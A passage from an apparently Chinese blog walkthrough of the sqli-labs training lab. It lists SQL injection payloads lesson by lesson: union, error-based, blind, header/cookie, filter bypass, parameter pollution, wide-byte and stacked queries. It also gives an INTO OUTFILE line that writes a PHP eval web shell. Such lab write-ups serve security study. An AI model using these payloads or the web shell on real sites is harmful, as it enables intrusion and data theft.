class="line">修改 sql-connections/sql-labs/db-creds.inc MySQL用户名/密码</span><br><span class="line">放到 Apache 下或者 PHPstudy这种集成工具</span><br><span class="line"></span><br><span class="line">From your browser access the sql-labs folder to load index.html</span><br><span class="line">Click on the link setup/resetDB to create database, create tables and populate Data.</span><br><span class="line">Labs ready to be used, click on lesson number to open the lesson page.</span><br><span class="line">Enjoy the labs</span><br></pre></td></tr></table></figure><h4 id="小记录"><a href="#小记录" class="headerlink" title="小记录"></a>小记录</h4><p>注释符：<code>--+</code>，实际是 <code>--空格</code>，<code>#</code></p><p>注意 <code>url</code> 编码，如 <code>#</code> ，不进行编码 <code>%23</code> 的话，可能被服务器认为是锚点</p><h5 id="Less-1-Error-based-Single-quotes"><a href="#Less-1-Error-based-Single-quotes" class="headerlink" title="Less-1 Error based - Single quotes"></a>Less-1 Error based - Single quotes</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h5 id="Less-2-Error-based-Double-quotes"><a href="#Less-2-Error-based-Double-quotes" class="headerlink" title="Less-2 Error based - Double quotes"></a>Less-2 Error based - Double quotes</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h5 id="Less-3-Error-based-Single-quotes-with-twist"><a href="#Less-3-Error-based-Single-quotes-with-twist" class="headerlink" title="Less-3 Error based - Single quotes with twist"></a>Less-3 Error based - Single quotes with twist</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1') union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h5 id="Less-4-Error-based-Double-Quotes"><a href="#Less-4-Error-based-Double-Quotes" class="headerlink" title="Less-4 Error based - Double Quotes"></a>Less-4 Error based - Double Quotes</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1") union <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, flag <span class="keyword">from</span> flag%<span class="number">23</span></span><br></pre></td></tr></table></figure><h5 id="Less-5-Double-Injection-Single-Quotes"><a href="#Less-5-Double-Injection-Single-Quotes" class="headerlink" title="Less-5 Double Injection - Single Quotes"></a>Less-5 Double Injection - Single Quotes</h5><p>二次注入有点懵逼，直接注入没有任何回显，函数报错盲注搞起</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23</span><br></pre></td></tr></table></figure><h5 id="Less-6-Double-Injection-Double-Quotes"><a href="#Less-6-Double-Injection-Double-Quotes" class="headerlink" title="Less-6 Double Injection - Double Quotes"></a>Less-6 Double Injection - Double Quotes</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=11" and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23</span><br></pre></td></tr></table></figure><h5 id="Less-7-Dump-into-outfile"><a href="#Less-7-Dump-into-outfile" class="headerlink" title="Less-7 Dump into outfile"></a>Less-7 Dump into outfile</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_GET["cmd"])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\a.php'</span>;</span><br></pre></td></tr></table></figure><h5 id="Less-8-Blind-Boolean-Based-Single-Quotes"><a href="#Less-8-Blind-Boolean-Based-Single-Quotes" class="headerlink" title="Less-8 Blind - Boolean Based - Single Quotes"></a>Less-8 Blind - Boolean Based - Single Quotes</h5><p>没有任何报错信息，无法直接根据报错注入，时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1' and if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>, <span class="number">1</span>), <span class="number">1</span>, <span class="number">1</span>))=<span class="number">68</span> ,<span class="number">1</span> , <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h5 id="Less-9、Less-10-这两个与-8-类似"><a href="#Less-9、Less-10-这两个与-8-类似" class="headerlink" title="Less-9、Less-10 这两个与 8 类似"></a>Less-9、Less-10 这两个与 8 类似</h5><h5 id="Less-11-Error-Based-Single-quotes"><a href="#Less-11-Error-Based-Single-quotes" class="headerlink" title="Less-11 Error Based - Single quotes"></a>Less-11 Error Based - Single quotes</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1' union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag<span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h5 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1") union <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag<span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h5 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h5><p>发现有报错信息，尝试报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1') and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h5 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h5><p>双引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1" and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>)));%23&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure><h5 id="Less-15-Less-16"><a href="#Less-15-Less-16" class="headerlink" title="Less-15 Less-16"></a>Less-15 Less-16</h5><h5 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h5><p>利用 update 注入，有明显的报错信息，可以报错注入，并且没有验证之前的密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=11'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>))<span class="comment">#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h5 id="Less-18-Header-Injection-Uagent-field-Error-based"><a href="#Less-18-Header-Injection-Uagent-field-Error-based" class="headerlink" title="Less-18 Header Injection  - Uagent field - Error based"></a>Less-18 Header Injection  - Uagent field - Error based</h5><p>UA 注入，要先登录才有回显，注意闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>)) <span class="keyword">and</span> <span class="string">'</span></span><br></pre></td></tr></table></figure><h5 id="Less-19-Header-Injection-Referer-field-Error-based"><a href="#Less-19-Header-Injection-Referer-field-Error-based" class="headerlink" title="Less-19 Header Injection  - Referer field - Error based"></a>Less-19 Header Injection  - Referer field - Error based</h5><h5 id="Less-20-Cookie-injection-Uagent-field-Error-based"><a href="#Less-20-Cookie-injection-Uagent-field-Error-based" class="headerlink" title="Less-20 Cookie injection - Uagent field - Error based"></a>Less-20 Cookie injection - Uagent field - Error based</h5><p>cookie 注入，同样有报错，改了cookie后不会影响登录状态吗？</p><h5 id="Less-21-Less-22-与前面的类似"><a href="#Less-21-Less-22-与前面的类似" class="headerlink" title="Less-21 Less-22 与前面的类似"></a>Less-21 Less-22 与前面的类似</h5><h5 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h5><p>发现 <code>#, --</code> 被过滤，可换 <code>;%00</code>，或者直接闭合单引号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br><span class="line"><span class="string">?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>();%00</span><br><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="string">'3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 报错注入</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure><h5 id="Less-24-Second-Oder-Injections-Real-treat-Stored-injection"><a href="#Less-24-Second-Oder-Injections-Real-treat-Stored-injection" class="headerlink" title="Less-24 Second Oder Injections Real treat - Stored injection"></a>Less-24 Second Oder Injections <em>Real treat</em> - Stored injection</h5><p>二次排序注入，将可能导致 sql 注入的字符先存入数据库，当再次调用这个恶意构造的字符时，就可以触发注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">users</span> <span class="keyword">SET</span> <span class="keyword">PASSWORD</span>=<span class="string">'$pass'</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$curr_pa'</span>;</span><br></pre></td></tr></table></figure><p>对于本题的 <code>sql</code> 语句来说，如果先注册一个 <code>admin&#39;#</code> 用户，此用户改密码的时候也修改了 <code>admin</code> 的密码。</p><p>所以有无严格控制用户的输入对安全影响特别大。</p><h5 id="Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><a href="#Less-25-Error-Based-All-your-OR-amp-AND-belong-to-us-integer-based" class="headerlink" title="Less-25 Error Based - All your OR &amp; AND belong to us - integer based"></a>Less-25 Error Based - All your OR &amp; AND belong to us - integer based</h5><p>题意是说过滤了 <code>or, and</code>，并且展示了过滤后的字符串在下方，同时也有报错，所以方法很多</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2' union <span class="keyword">select</span> <span class="number">1</span>, <span class="keyword">database</span>(), <span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><code>or, and</code> 可以用 <code>||, &amp;&amp;</code> 代替，本题还可用 <code>o/**/r</code> 或者 <code>oorr</code></p><h5 id="Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based"><a href="#Less-25a-Blind-Based-All-your-OR-amp-AND-belong-to-us-integer-based" class="headerlink" title="Less-25a Blind Based - All your OR &amp; AND belong to us - integer based"></a>Less-25a Blind Based - All your OR &amp; AND belong to us - integer based</h5><p>与 Less-25 大同小异</p><h5 id="Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）"><a href="#Less-26-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us（待研究）" class="headerlink" title="Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）"></a>Less-26 Error based - All your SPACES and COMMENTS belong to us（待研究）</h5><p>尝试了所有的空白符，居然都不行，有个 <code>%a0</code> 没被过滤，但是不解析，不过 Linux 上可以成功解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//过滤空白符，如换行、换页、空格、制表符</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0%27union%a0select%a01,database(),3;%00  <span class="comment">-- linux（phpstudy上不解析，待研究）</span></span><br><span class="line">?id=0%27union(<span class="keyword">select</span>(<span class="number">1</span>),<span class="keyword">database</span>(),<span class="number">3</span>);%00  <span class="comment">-- 直接用括号分隔</span></span><br><span class="line">?id=-1%27anandd(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">user</span>())),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure><h5 id="Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us"><a href="#Less-26a-Blind-based-All-your-SPACES-and-COMMENTS-belong-to-us" class="headerlink" title="Less-26a Blind based - All your SPACES and COMMENTS belong to us"></a>Less-26a Blind based - All your SPACES and COMMENTS belong to us</h5><p>多了个 <code>()</code> ，没有报错回显，依然 <code>%a0</code>，也可以盲注</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>%<span class="number">27</span>)<span class="class"><span class="keyword">union</span>(<span class="title">select</span>(1),<span class="title">database</span>(),3);</span>%<span class="number">0</span>0</span><br></pre></td></tr></table></figure><h5 id="Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us"><a href="#Less-27-Error-based-All-your-UNION-and-SELECT-belong-to-us" class="headerlink" title="Less-27 Error based - All your UNION and SELECT belong to us"></a>Less-27 Error based - All your UNION and SELECT belong to us</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">'/[\/\*]/'</span>, <span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>, <span class="string">""</span>, $id);<span class="comment">//Strip out select</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>select, union, 空格</code> 过滤不彻底</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%<span class="number">27</span>and(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(seLect%<span class="number">0</span>aflag%<span class="number">0</span>afrom%<span class="number">0</span>aflag),<span class="number">0x7e</span>)));%<span class="number">00</span></span><br></pre></td></tr></table></figure><h5 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">"%0aUnIon%0aSElecT%0a1,(SeLect%0aflag%0afrom%0aflag),"</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h5 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/union\s+select/i'</span>, <span class="string">""</span>, $id);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br></pre></td></tr></table></figure><p>不能同时出现 <code>union select</code>，还是遇到了之前那个 <code>%a0</code> 不解析的问题，但是可以 <code>union all select</code>，科学计数法 <code>0e1union</code> 也不行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0')%0aunion%0aall%0aseLect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database();%00</span><br></pre></td></tr></table></figure><p>如果可以报错注入的话</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2')%0aand%0a(extractvalue(1,concat(0x7e,(<span class="keyword">seLect</span>%<span class="number">0</span>agroup_concat(table_name)%<span class="number">0</span>afrom%<span class="number">0</span>ainformation_schema.tables%<span class="number">0</span>awhere%<span class="number">0</span>atable_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>)));%00</span><br></pre></td></tr></table></figure><h5 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h5><p>与 28 差不多，并且过滤还减少了。。</p><h5 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h5><p>一旦输入不是数字，直接跳到 <code>hacked.php</code>，一看源码可知存在 <code>HPP</code>即参数污染，这实际上是一个逻辑问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$id1 = java_implimentation($qs);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数污染在这里，php 同时接到两个一样的参数，以后一个为准</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">whitelist($id1);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;  <span class="comment">// 为啥不插 $id1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">$match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line"><span class="keyword">if</span> (!$match) &#123;</span><br><span class="line">header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一找到 id 就返回，即返回的是第一个 id 的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span> </span>&#123;</span><br><span class="line">$q_s = $query_string;</span><br><span class="line">$qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">$val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>($val==<span class="string">"id"</span>) &#123;</span><br><span class="line">$id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line"><span class="keyword">return</span> $id_value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题一旦发现是参数污染，即入无人之境，毫无过滤。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&amp;id=0' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><h5 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h5><p>与 29 同，只是拼接了一个 <code>“”</code>。</p><h5 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h5><p>在前面的基础上又加了一个 <code>()</code>。</p><hr><p>Less-32,33,34,35,36,37六关全部是针对 <code>’</code> 和  <code>\</code> 的过滤，可用宽字节绕过</p><p>原理：<code>mysql</code> 在使用 <code>gbk</code> 编码的时候，会将两个字符当做一个汉字。例如 <code>%aa%5c</code> ，前一个 <code>ASCII</code> 码超过 <code>128</code> 才会达到汉字的范围。</p><hr><h5 id="Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><a href="#Less-32-Bypass-custom-filter-adding-slashes-to-dangerous-chars" class="headerlink" title="Less-32 Bypass custom filter adding slashes to dangerous chars"></a>Less-32 Bypass custom filter adding slashes to dangerous chars</h5><p>干掉 slash 有如下方法</p><p>1、<code>%df</code>  吃掉 <code>\</code>   具体的原因是 <code>urlencode(‘)  = %5c%27</code>，我们在 <code>%5c%27</code> 前面添加 <code>%df</code>，形成 <code>%df%5c%27</code>，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时 <code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br>2、将 <code>\’</code> 中的 <code>\</code> 过滤掉，例如可以构造 <code>%**%5c%5c%27</code> 的情况，后面的 <code>%5c</code> 会被前面的 <code>%5c</code> 给注释掉。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0%df' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>那第二种方法？</p><h5 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h5><p><code>Addslashes()</code> 函数依旧可以利用 <code>%df</code> 进行绕过。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下列字符将被加上 <span class="symbol">\ </span>进行转义</span><br><span class="line">单引号（'）双引号（"）反斜杠（<span class="symbol">\）</span>NULL</span><br></pre></td></tr></table></figure><p><strong>Notice：</strong>使用 <code>addslashes()</code> ，我们需要将 <code>mysql_query</code> 设置为 <code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><h5 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h5><p>此处是 <code>post</code>，将 <code>utf-8</code> 转换为 <code>utf-16</code> 或 <code>utf-32</code>，例如将 <code>‘</code>  转为 <code>utf-16</code>为  �’  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=�' <span class="keyword">or</span> 1#&amp;<span class="attribute">passwd</span>=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure><h5 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h5><p>35 关和 33关是大致的一样的，唯一的区别在于 <code>sql</code> 语句的不同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>没有 <code>‘</code>，就没必考虑 <code>addslashes()</code> 函数的意义了</p><h5 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$string = mysql_real_escape_string($string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下列字符将受影响</span></span><br><span class="line">\x00\n\r\<span class="string">'"\x1a</span></span><br></pre></td></tr></table></figure><p>依然宽字节注入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span><span class="symbol">%EF</span><span class="symbol">%BF</span><span class="symbol">%BD</span><span class="symbol">%27</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p><strong>Notice:</strong><br>在使用 <code>mysql_real_escape_string()</code> 时，需要将 <code>mysql</code> 设置为 <code>gbk</code> 即可。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">mysql_set_charset</span><span class="params">(‘gbk’,’<span class="variable">$conn</span>’)</span></span></span><br></pre></td></tr></table></figure><h5 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h5><p>利用 34 关的 payload</p><hr><p>以下正式进入堆叠注入，即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><p>由于 <code>sql</code> 语句是以 <code>;</code> 分隔，所以在查询语句的基础，我们还可以加多条语句。</p><hr><h5 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h5><p>没有什么过滤，可以为所欲为，比如直接插入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 